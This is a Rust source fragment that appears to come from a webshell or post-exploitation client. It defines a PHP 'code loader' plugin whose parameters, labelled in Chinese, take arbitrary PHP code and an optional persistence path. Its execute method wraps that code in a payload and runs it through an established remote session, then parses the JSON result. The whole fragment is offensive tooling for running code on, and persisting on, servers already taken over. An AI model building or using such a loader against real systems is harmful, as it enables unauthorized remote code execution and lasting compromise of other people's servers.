            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![
                ParamSpec {
                    name: "code".into(),
                    label: "PHP 代码".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("echo 'loaded';")),
                    options: None,
                },
                ParamSpec {
                    name: "persist_path".into(),
                    label: "持久化路径（可选，写入后提示）".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("")),
                    options: None,
                },
            ],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "代码加载器仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        let code = param_str(params, "code", "echo 'loaded';");
        let persist = param_str(params, "persist_path", "");
        let payload = php_code_loader_code(&code, &persist);
        let output = protocol.run_code(session, "php", &payload, settings)?;
        serde_json::from_str(&output)
            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
    }
}
